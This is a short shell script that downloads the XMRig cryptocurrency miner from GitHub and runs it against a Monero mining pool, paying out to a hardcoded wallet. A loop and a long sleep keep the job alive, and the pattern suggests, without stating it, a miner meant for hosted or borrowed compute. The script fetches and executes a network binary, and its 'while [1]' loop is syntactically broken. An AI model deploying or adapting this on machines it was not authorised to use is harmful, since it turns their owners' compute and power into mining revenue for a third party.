#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar xf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
./xmrig --url pool.hashvault.pro:80 --user 41w8QP1Xwh9gZZpLvioWKA6xXNzDNCPWm2UxV4YCBkdzbwdHvVVwWRbREBjMDdicFd3H8y9ZPLByZCAYPAVYq32VATyDpUE --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
while [1]; do
sleep 3
done
sleep 999
